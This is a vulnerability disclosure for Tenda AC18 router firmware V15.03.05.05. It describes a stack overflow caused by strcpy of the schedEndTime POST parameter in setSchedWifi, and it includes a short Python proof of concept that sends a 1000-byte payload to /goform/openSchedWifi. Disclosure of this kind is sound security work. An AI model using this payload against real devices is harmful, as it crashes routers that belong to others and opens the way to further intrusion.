## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `setSchedWifi` function. The `v20` variable receives the `schedEndTime` parameter from a POST request and is later assigned to the `ptr` variable, which is fixed at 25 bytes. However, since the user can control the input of `schedEndTime`, the statement `strcpy((char *)ptr + 10, v20);` can cause a buffer overflow. The user-provided `schedEndTime` can exceed the capacity of the `ptr` array, triggering this security vulnerability.

![image-20240305225509194](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305225509194.png)

![image-20240305225530022](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305225530022.png)

![image-20240305225603036](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305225603036.png)

![image-20240305225551018](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305225551018.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/openSchedWifi"
payload = b"a"*1000

data = {"schedWifiEnable":0,"schedEndTime": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305225331471](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305225331471.png)
